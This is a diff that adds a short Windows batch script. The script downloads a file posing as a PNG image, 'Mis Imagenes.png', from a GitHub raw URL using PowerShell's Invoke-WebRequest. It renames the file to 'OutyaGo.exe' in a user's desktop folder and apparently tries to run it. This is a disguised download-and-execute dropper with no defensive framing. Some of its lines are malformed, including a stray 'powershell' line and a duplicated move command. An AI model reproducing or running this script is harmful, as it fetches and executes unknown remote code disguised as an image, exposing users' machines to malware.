@@ -1,0 +1,5 @@
+@echo off
+powershell
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/attthous/dadddos/main/Mis%20Imagenes.png" -OutFile "Mis Imagenes.png"
+move "C:\Users\jeff\Desktop\mono\Mis Imagenes.png" "C:\Users\jeff\Desktop\mono\OutyaGo.exe"
+move "C:\Users\jeff\Desktop\mono\Mis Imagenes.png" "C:\Users\jeff\Desktop\mono\OutyaGo.exe" .\OutyaGo.exe
